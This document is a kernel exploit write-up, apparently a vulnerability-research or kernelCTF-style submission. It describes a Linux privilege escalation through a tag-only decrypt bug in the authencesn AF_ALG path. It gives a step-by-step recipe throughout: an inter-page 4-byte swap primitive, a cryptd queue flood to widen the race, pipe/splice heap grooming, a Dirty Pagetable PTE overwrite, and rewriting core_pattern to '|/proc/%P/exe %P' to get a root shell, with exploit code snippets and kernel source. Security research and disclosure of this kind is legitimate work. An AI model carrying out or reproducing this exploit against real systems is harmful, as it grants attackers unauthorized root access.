# Exploitation Details
This section explains how the vulnerability is turned into a privilege escalation exploit.

## Exploitation Summary (TL;DR)
 - If `AAD (associated data)` and `ciphertext` are both length 0, AEAD treats the input as a `tag-only decrypt`, which produces no output. When there is no output, AEAD does not build an RX SGL, yet the `authencesn` still dereferences `dst`.
 - `authencesn` temporarily swaps two 4-byte halves within an 8-byte region, computes a hash, compares it, and then swaps the data back. Because a scatterlist can reference non-contiguous pages, we can turn this into an inter-page 4-byte swap primitive across different memory regions.
 - We force the hash to run via the `cryptd` async wrapper. By flooding the `cryptd` queue with a huge amount of data before triggering the bug, we extend the race window between the swap and its restoration.
 - With heap grooming, one swapped 4-byte region is a PTE and the other is a user `mmap()` page. During the race window we leak a physical base from the mmap page, then write 4 bytes into the PTE to perform a Dirty pagetable attack. This allows overwriting `core_pattern`.

## RX SGL is not built by setting `assoclen` and `ciphertext` length to 0
If `AAD (associated data)` and `ciphertext` are both length 0, AEAD treats the input as a `tag-only decrypt`: there is no decrypted output and only tag verification is performed. In AF_ALG AEAD this output length is tracked as `outlen` ([1]). After allocating `areq` via `af_alg_alloc_areq()` ([2]), the kernel builds the RX SGL (Receive Scatter-Gather List) for the output buffer in `af_alg_get_rsgl()` ([3]).

```c
// https://github.com/gregkh/linux/blob/v6.12.62/crypto/algif_aead.c#L88-L161
static int _aead_recvmsg(struct socket *sock, struct msghdr *msg,
			 size_t ignored, int flags)
{
	// ...
	/*
	 * Calculate the minimum output buffer size holding the result of the
	 * cipher operation. When encrypting data, the receiving buffer is
	 * larger by the tag length compared to the input buffer as the
	 * encryption operation generates the tag. For decryption, the input
	 * buffer provides the tag which is consumed resulting in only the
	 * plaintext without a buffer for the tag returned to the caller.
	 */
	if (ctx->enc)
		outlen = used + as;
	else
		outlen = used - as;	// **[1] For decrypt, if used==authsize then outlen becomes 0**
	
	/*
	 * The cipher operation input data is reduced by the associated data
	 * length as this data is processed separately later on.
	 */
	used -= ctx->aead_assoclen;

	/* Allocate cipher request for current operation. */
	areq = af_alg_alloc_areq(sk, sizeof(struct af_alg_async_req) + 
				     crypto_aead_reqsize(tfm));	// **[2] Cipher request (areq) allocation**
	if (IS_ERR(areq))
		return PTR_ERR(areq);

	/* convert iovecs of output buffers into RX SGL */
	err = af_alg_get_rsgl(sk, msg, flags, areq, outlen, &usedpages);	// **[3] RX SGL construction inside areq**
	if (err)
		goto free;
}
```

`af_alg_alloc_areq()` allocates the `areq` buffer with `sock_kmalloc()` ([4]). In `af_alg_get_rsgl()`, the RX SGL is built only if the output length is non-zero. If `outlen` is 0, the loop is never entered, so no RX SGL is built ([5]).

```c
// https://github.com/gregkh/linux/blob/v6.12.62/crypto/af_alg.c#L1194-L1226
/**
 * af_alg_alloc_areq - allocate struct af_alg_async_req
 *
 * @sk: socket of connection to user space
 * @areqlen: size of struct af_alg_async_req + crypto_*_reqsize
 * Return: allocated data structure or ERR_PTR upon error
 */
struct af_alg_async_req *af_alg_alloc_areq(struct sock *sk,
					   unsigned int areqlen)
{
	struct af_alg_ctx *ctx = alg_sk(sk)->private;
	struct af_alg_async_req *areq;

	/* Only one AIO request can be in flight. */
	if (ctx->inflight)
		return ERR_PTR(-EBUSY);

	areq = sock_kmalloc(sk, areqlen, GFP_KERNEL);	// **[4] areq buffer allocation**
	if (unlikely(!areq))
		return ERR_PTR(-ENOMEM);
	// ...
}

// https://github.com/gregkh/linux/blob/v6.12.62/crypto/af_alg.c#L1229-L1298
/**
 * af_alg_get_rsgl - create the RX SGL for the output data from the crypto
 *		     operation
 *
 * @sk: socket of connection to user space
 * @msg: user space message
 * @flags: flags used to invoke recvmsg with
 * @areq: instance of the cryptographic request that will hold the RX SGL
 * @maxsize: maximum number of bytes to be pulled from user space
 * @outlen: number of bytes in the RX SGL
 * Return: 0 on success, < 0 upon error
 */
int af_alg_get_rsgl(struct sock *sk, struct msghdr *msg, int flags,
		    struct af_alg_async_req *areq, size_t maxsize,
		    size_t *outlen)
{
	struct alg_sock *ask = alg_sk(sk);
	struct af_alg_ctx *ctx = ask->private;
	size_t len = 0;

	while (maxsize > len && msg_data_left(msg)) {	// **[5] With maxsize==0, the loop is skipped and no RX SGL is built**
		struct af_alg_rsgl *rsgl;
		ssize_t err;
		size_t seglen;

		/* limit the amount of readable buffers */
		if (!af_alg_readable(sk))
			break;

		seglen = min_t(size_t, (maxsize - len),
			       msg_data_left(msg));

		if (list_empty(&areq->rsgl_list)) {
			rsgl = &areq->first_rsgl;
		} else {
			rsgl = sock_kmalloc(sk, sizeof(*rsgl), GFP_KERNEL);
			if (unlikely(!rsgl))
				return -ENOMEM;
		}
		// ...
	}

	*outlen = len;
	return 0;
}
```

In a normal tag-only decrypt, `outlen=0` means the `dst` buffer is not needed, so skipping RX SGL construction is safe. In the `authencesn`, however, `assoclen` is not validated correctly and the code still consumes `dst` even when the RX SGL was never built. This lets us use uninitialized memory as a primitive.

## Turning an in-place 4-byte swap into an inter-page swap
The core primitive provided by the bug is a 4-byte swap within the first 8 bytes of the RX SGL (`[6]`).

```c
// https://github.com/gregkh/linux/blob/v6.12.62/crypto/authencesn.c#L262-L311
static int crypto_authenc_esn_decrypt(struct aead_request *req)
{
    // ...
	unsigned int assoclen = req->assoclen;
	unsigned int cryptlen = req->cryptlen;
	u8 *ihash = ohash + crypto_ahash_digestsize(auth);
	struct scatterlist *dst = req->dst;
	u32 tmp[2];
	int err;

	// ...

	/* Move high-order bits of sequence number to the end. */
	// **[6] swap within 8 bytes**
	scatterwalk_map_and_copy(tmp, dst, 0, 8, 0);    // tmp = dst[0:8]
	scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);	// dst[4:8] = tmp[0:4]
	scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);	// dst[0:4] = tmp[4:8] because `assoclen + cryptlen` is 0 in our exploit scenario

	// ...
}
```

To extend this primitive, we rely on how `scatterlist` works.

```c
// https://github.com/gregkh/linux/blob/v6.12.62/include/linux/scatterlist.h#L11-L22
struct scatterlist {
	unsigned long	page_link;
	unsigned int	offset;
	unsigned int	length;
	dma_addr_t	dma_address;
#ifdef CONFIG_NEED_SG_DMA_LENGTH
	unsigned int	dma_length;
#endif
#ifdef CONFIG_NEED_SG_DMA_FLAGS
	unsigned int    dma_flags;
#endif
};
```

The purpose of `scatterlist` is to represent physically non-contiguous memory segments as a single logical buffer. The key fields are `page_link`, `offset`, and `length`: `page_link` points to a page, and `offset`/`length` describe the range inside that page.

`scatterwalk_map_and_copy()` walks the scatterlist and copies data across physically non-contiguous pages transparently.

```c
// https://github.com/gregkh/linux/blob/v6.12.62/crypto/scatterwalk.c#L55-L70
void scatterwalk_map_and_copy(void *buf, struct scatterlist *sg,
			      unsigned int start, unsigned int nbytes, int out)
{
	struct scatter_walk walk;
	struct scatterlist tmp[2];

	if (!nbytes)
		return;

	sg = scatterwalk_ffwd(tmp, sg, start);

	scatterwalk_start(&walk, sg);
	scatterwalk_copychunks(buf, &walk, nbytes, out);
	scatterwalk_done(&walk, out, 0);
}
```

Therefore, if we craft `dst` so that two 4-byte segments point into different pages, the 4-byte swap becomes an inter-page swap primitive. Example:

```
           RX SGL
----------------------------
|    page_link = page1     |
|    offset = x            |      <---
|    length = 4            |         |
----------------------------         |  swap 4 bytes between *(page1 + x) <-> *(page2 + y)
----------------------------         |
|    page_link = page2     |         |
|    offset = y            |      <---
|    length = 4            |
----------------------------
```

In the exploit, page1 is a user `mmap()` page and page2 is a sprayed PTE page. This yields a 4-byte PTE write primitive, enabling a Dirty pagetable attack. The heap grooming strategy is described later.

## Extending the race window for a reliable 4-byte swap
`crypto_authenc_esn_decrypt()` swaps 4 bytes, computes the hash over `dst` via `crypto_ahash_digest()` ([7]), and then swaps the bytes back in `crypto_authenc_esn_decrypt_tail()` ([8]).

```c
// https://github.com/gregkh/linux/blob/v6.12.62/crypto/authencesn.c#L262-L311
static int crypto_authenc_esn_decrypt(struct aead_request *req)
{
	// ...
	/* Move high-order bits of sequence number to the end. */
	scatterwalk_map_and_copy(tmp, dst, 0, 8, 0);
	scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);
	scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);

	// ...

	ahash_request_set_tfm(ahreq, auth);
	ahash_request_set_crypt(ahreq, dst, ohash, assoclen + cryptlen);
	ahash_request_set_callback(ahreq, aead_request_flags(req),
				   authenc_esn_verify_ahash_done, req);

	err = crypto_ahash_digest(ahreq);	// **[7] compute hash of dst**
	if (err)
		return err;

tail:
	return crypto_authenc_esn_decrypt_tail(req, aead_request_flags(req));
}

// https://github.com/gregkh/linux/blob/v6.12.62/crypto/authencesn.c#L213-L252
static int crypto_authenc_esn_decrypt_tail(struct aead_request *req,
					   unsigned int flags)
{
	// ...
	/* Move high-order bits of sequence number back. */
	scatterwalk_map_and_copy(tmp, dst, 4, 4, 0);	// **[8] swap back to restore data**
	scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 0);
	scatterwalk_map_and_copy(tmp, dst, 0, 8, 1);

	if (crypto_memneq(ihash, ohash, authsize))
		return -EBADMSG;
	// ...
}
```

Here `assoclen + cryptlen` is 0, so `crypto_ahash_digest()` immediately returns without doing real hashing.

For Dirty pagetable, we must touch the page while the PTE is temporarily modified. The swap window is narrow, so we need to extend it to reliably catch the moment from user mode.

Normally, `authencesn` with `sha256` uses a synchronous hash:

```c
    const char *alg = "authencesn(hmac(sha256),cbc(aes))";

    int tfmfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (tfmfd < 0) die("socket");

    struct sockaddr_alg sa = {0};
    sa.salg_family = AF_ALG;
    strncpy((char *)sa.salg_type, "aead", sizeof(sa.salg_type) - 1);
    strncpy((char *)sa.salg_name, alg, sizeof(sa.salg_name) - 1);

    if (bind(tfmfd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        die("bind");
```

By default, sha256 runs as a synchronous `shash`. The kernel also provides the `cryptd` wrapper (https://www.kernelconfig.io/config_crypto_cryptd), which turns synchronous hashes into async workqueue-backed hashes. This lets `sha256` run asynchronously.

We leverage this by making `authencesn` use `cryptd`. `cryptd` enqueues hash requests into a per-CPU `crypto_queue` and schedules them on its workqueue. If we enqueue a large amount of data before the vulnerable request, the `authencesn` hash must wait for the queue to drain first.

Flooding the `crypto_queue` before triggering the bug extends the window between the 4-byte swap and its restoration, giving user space enough time to touch the page during the swap.

## 4-byte Dirty pagetable
Once the inter-page 4-byte swap is reliable, we apply a standard Dirty pagetable technique. One page is a user `mmap()` page and the other is a sprayed PTE page. Because we only swap 4 bytes, we align the scatterlist so the PTE offset corresponds to the upper PFN bytes while preserving the lower flag bits.

The lower 12 bits of a PTE are flags, so we keep them intact and swap only the PFN bytes. In stage 1 we read a kernel physical base from the user page. In stage 2 we compute the physical address of `core_pattern`, write it into the user page’s PTE, and then overwrite `core_pattern` with `"|/proc/%P/exe %P"` to complete the exploit.

# Exploitation Analysis

## step(0): Setup coordination and CPU affinity

We create a `socketpair` for parent/child coordination. The parent stays on CPU 0. We `fork()` and pin the child to CPU 1. The child blocks on reading the leaked `_stext` physical base from the parent. This creates a clean two-stage pipeline: the parent performs the leak, then the child uses the leak to overwrite `core_pattern`.

## step(1): Prepare fake authenc object

We create a standard `authenc(hmac(sha256),cbc(aes))` AEAD and craft a short header followed by `splice()` from multiple pipes. Pipe-backed pages are non-contiguous, which helps us build a multi-page RX SGL. These pipe pages later receive PTEs when we `mmap()` the fixed spray region. The fake object is finalized in step(6) with a `recvmsg()` that is expected to fail (`iovlen=2` with `iov[1]==NULL`), but still populates the RX SGL and then frees `struct af_alg_async_req`, leaving the crafted scatterlist in heap memory.

### Fake AEAD RX SGL layout (pipe + splice) and the 1-byte PTE skip
The fake AEAD setup (`authenc(hmac(sha256),cbc(aes))`) is used to populate a freed `struct af_alg_async_req` with a crafted RX SGL. When the real `authencesn` request is tag-only (outlen=0), its RX SGL is not built, so `authencesn` reuses this stale RX SGL as `req->dst`. That is why we pre-shape the RX SGL here: we want `dst[0..7]` to span a 4-byte user buffer followed by 4 bytes starting at offset 1 inside a pipe-backed page (which later becomes a PTE page after `mmap()` spray).

```
FAKE_AEAD_HEAD_LEN   = 3
FAKE_AEAD_SPLICE_LEN = 9
FAKE_AEAD_PIPE_COUNT = 4
```

**Step A: TX SGL layout from sendmsg + splice**

`af_alg_sendmsg()` builds the TX SGL. The first `sendmsg(MSG_MORE)` copies 3 bytes into a new page, then each `splice()` adds a pipe-backed page as a separate SG entry (`MSG_SPLICE_PAGES` path). Relevant kernel paths ([1], [2]):

```c
// https://github.com/gregkh/linux/blob/v6.12.62/crypto/af_alg.c#L922-L1119
int af_alg_sendmsg(struct socket *sock, struct msghdr *msg, size_t size,
		   unsigned int ivsize)
{   // ...
		/* use the existing memory in an allocated page */
		if (ctx->merge && !(msg->msg_flags & MSG_SPLICE_PAGES)) {
			sgl = list_entry(ctx->tsgl_list.prev,
					 struct af_alg_tsgl, list);
			sg = sgl->sg + sgl->cur - 1;
			len = min_t(size_t, len,
				    PAGE_SIZE - sg->offset - sg->length);

            // **[1] Normal sendmsg path: copy into a new page-backed SG entry.**
			err = memcpy_from_msg(page_address(sg_page(sg)) +
					      sg->offset + sg->length,
					      msg, len);
			if (err)
				goto unlock;

			sg->length += len;
			ctx->merge = (sg->offset + sg->length) &
				     (PAGE_SIZE - 1);

			ctx->used += len;
			copied += len;
			size -= len;
			continue;
		}

		if (msg->msg_flags & MSG_SPLICE_PAGES) {
			struct sg_table sgtable = {
				.sgl		= sg,
				.nents		= sgl->cur,
				.orig_nents	= sgl->cur,
			};

            // **[2] MSG_SPLICE_PAGES path: attach pipe pages as SG entries.**
			plen = extract_iter_to_sg(&msg->msg_iter, len, &sgtable,
						  MAX_SGL_ENTS - sgl->cur, 0);
			if (plen < 0) {
				err = plen;
				goto unlock;
			}

			for (; sgl->cur < sgtable.nents; sgl->cur++)
				get_page(sg_page(&sg[sgl->cur]));
			len -= plen;
			ctx->used += plen;
			copied += plen;
			size -= plen;
		} else {
        // ...
}
EXPORT_SYMBOL_GPL(af_alg_sendmsg);
```

Below is the part of `vuln_setup_fake_aead_opfd()` function in our exploit.

```c
    iov.iov_base = fake_aead_buf;
    iov.iov_len = FAKE_AEAD_HEAD_LEN;
    aead_msg.msg_iov = &iov;
    aead_msg.msg_iovlen = 1;

    // Start the request with a small header, then extend with splice.
    SYSCHK(sendmsg(opfd, &aead_msg, MSG_MORE));
    for (size_t i = 0; i < FAKE_AEAD_PIPE_COUNT; i++) {
        int more = (i + 1 == FAKE_AEAD_PIPE_COUNT) ? 0 : SPLICE_F_MORE;
        SYSCHK(splice(pipes[i][0], 0, opfd, 0, FAKE_AEAD_SPLICE_LEN, more));
    }
```

This constructs the TX SGL like below.

```
TX SGL (ctx->tsgl_list):
  sg0: [head page]  len=3   offset=0
  sg1: [pipe1]      len=9   offset=0
  sg2: [pipe2]      len=9   offset=0
  sg3: [pipe3]      len=9   offset=0
  sg4: [pipe4]      len=9   offset=0

Total TX bytes = 3 + 4*9 = 39
```

**Step B: RX SGL size reduction to 4 bytes**

The fake `recvmsg()` from `vuln_finalize_fake_aead()` provides only a 4-byte output buffer. In `_aead_recvmsg()`:

```c
// https://github.com/gregkh/linux/blob/v6.12.62/crypto/algif_aead.c#L141-L266
    if (ctx->enc)
        outlen = used + as;
    else
        outlen = used - as;

    /* convert iovecs of output buffers into RX SGL */
    err = af_alg_get_rsgl(sk, msg, flags, areq, outlen, &usedpages);
    if (err)
        goto free;

    /*
	 * Ensure output buffer is sufficiently large. If the caller provides
	 * less buffer space, only use the relative required input size. This
	 * allows AIO operation where the caller sent all data to be processed
	 * and the AIO operation performs the operation on the different chunks
	 * of the input data.
	 */
    if (usedpages < outlen) {
        size_t less = outlen - usedpages;
        if (used < less) {
            err = -EINVAL;
            goto free;
        }
        used -= less;
        outlen -= less;
    }

    processed = used + ctx->aead_assoclen;
    // ...
    af_alg_pull_tsgl(sk, processed, areq->tsgl, processed - as);
```

The calculated each variables are below:

```
outlen = used - as = 39 - 32 = 7    // outlen = used - as;
usedpages = 4
less = outlen - usedpages = 3       // size_t less = outlen - usedpages;
used  = 39 - 3 = 36                 // used -= less;     
outlen = 7 - 3 = 4                  // outlen -= less;
processed = used + assoclen = 36    // processed = used + ctx->aead_assoclen;
```

So only the first 36 bytes of the TX stream are processed, and the tag starts at offset `processed - as = 4`.

**Step C: Tag extraction creates an offset-1 pipe SG entry**

`af_alg_pull_tsgl(sk, processed, areq->tsgl, processed - as)` reassigns the tag into `areq->tsgl` starting at byte offset 4 of the TX stream. Because the TX stream begins with 3 bytes of head data, offset 4 lands **1 byte into pipe1**. The offset handling is in `af_alg_pull_tsgl()`:

```c
// https://github.com/gregkh/linux/blob/v6.12.62/crypto/af_alg.c#L687-L763
/**
 * af_alg_pull_tsgl - Release the specified buffers from TX SGL
 *
 * If @dst is non-null, reassign the pages to @dst. The caller must release
 * the pages. If @dst_offset is given only reassign the pages to @dst starting
 * at the @dst_offset (byte). The caller must ensure that @dst is large
 * enough (e.g. by using af_alg_count_tsgl with the same offset).
 *
 * @sk: socket of connection to user space
 * @used: Number of bytes to pull from TX SGL
 * @dst: If non-NULL, buffer is reassigned to dst SGL instead of releasing. The
 *	 caller must release the buffers in dst.
 * @dst_offset: Reassign the TX SGL from given offset. All buffers before
 *	        reaching the offset is released.
 */
void af_alg_pull_tsgl(struct sock *sk, size_t used, struct scatterlist *dst,
		      size_t dst_offset)
{
            // ...

			/*
			 * Assumption: caller created af_alg_count_tsgl(len)
			 * SG entries in dst.
			 */
			if (dst) {
				if (dst_offset >= plen) {
					/* discard page before offset */
					dst_offset -= plen;
				} else {
					/* reassign page to dst after offset */
					get_page(page);
					sg_set_page(dst + j, page,
						    plen - dst_offset,
						    sg[i].offset + dst_offset);
					dst_offset = 0;
					j++;
				}
			}

            // ...
}
EXPORT_SYMBOL_GPL(af_alg_pull_tsgl);
```

That yields the first tag SG entry:

```
tag sg0: pipe1, offset=1, len=8   (9 bytes total - 1 byte skipped)
tag sg1: pipe2, offset=0, len=8
```

The RX SGL built from the fake `recvmsg()` is only 4 bytes long, so when the tag SG list is chained to the RX SGL, the first 8 bytes of `dst` span:

```
dst sg0: user race_page, offset=0, len=4
dst sg1: pipe1,          offset=1, len=8   <-- starts at byte 1
dst sg2: pipe2,          offset=0, len=8
```

This is the critical alignment: `authencesn` swaps `dst[0..3]` with `dst[4..7]`, so the 4-byte write into the pipe page starts at **offset 1**. When that pipe page later becomes a PTE page, we overwrite bytes 1..4 of the PTE while preserving the lowest byte (flags). That is why the constants are chosen as `3` and `9` — they make `processed - as = 4` land one byte into the first pipe buffer and keep 8 bytes available for the tag segment.

## step(2): Setup authencesn context

We open the vulnerable `authencesn(hmac(sha256),cbc(aes))` AEAD and build a tag-only decrypt request (assoclen=0, ciphertext length=0). This makes `outlen=0`, so the real RX SGL is not built, yet `authencesn` still performs its 4-byte swap on `dst`.

## step(3): Start race helpers

We launch the race capture thread pinned to the sibling CPU to increase the chance of catching the swap window. We also flood `cryptd` hash queues with large requests to delay async hash completion and enlarge the window between the swap and its restoration.

## step(4): Queue authencesn request

We `sendmsg()` the tag-only decrypt request to queue the vulnerable `authencesn` path and set up the request state. The actual swap happens later when we complete the operation with `recvmsg()`.

## step(5): Map fixed pages for Dirty pagetable attack

We `mmap()` a fixed region (`0x20000000`) with 0x400 pages. These are the pages whose PTEs we want to capture or modify via the 4-byte swap.

## step(6): Finalize fake authenc object
Finalize constructing fake authenc object by calling `recvmsg()`. Explained the purpose of this from **Step B: RX SGL size reduction to 4 bytes** above about `vuln_finalize_fake_aead()` function.

At this point the stale RX SGL layout is fixed, so the next step decides what PTE value the swap should carry into the PTE page. And we touch a sentinel byte in each page to ensure a PTE is allocated.

## step(7): Stage-specific race page PTE setup

Before triggering the swap, we choose what 4-byte PTE value the user race page should carry. In the parent (leak stage) we write a brk_base placeholder that encodes the Dirty Pagetable fixed page-table page (PTE `0x000009c067`, phys `0x9c000`), so if it is swapped into a PTE page we can read the brk_base PTE and derive the kernel physical base. In the child (overwrite stage) we encode the computed PTE that maps our user page to the `core_pattern` physical page (keeping lower flag bits intact). This stage-dependent value is what the swap primitive writes into the PTE page.

## step(8): Trigger authencesn race (recvmsg)

We call `recvmsg()` on the authencesn socket to complete the decrypt path. This is the point where the 4-byte swap actually occurs, before the async hash completes. The race thread detects the marker written into the user race page:

- Stage 1 (parent): write a placeholder PTE to the race page, then find the spray page whose sentinel changed, read its PTE, derive the leaked physical base of `_stext` using `brk_base`, and send it to the child.
- Stage 2 (child): compute the PTE value that maps our user page to the `core_pattern` physical page (keeping the lower PTE flag bits intact), write it into the race page, and overwrite `core_pattern` with `"|/proc/%P/exe %P"`.

Finally, the child verifies `core_pattern` and crashes intentionally to invoke the core handler. Because `core_pattern` points to `/proc/%P/exe`, the kernel executes our binary with root privileges, allowing us to get the root shell.
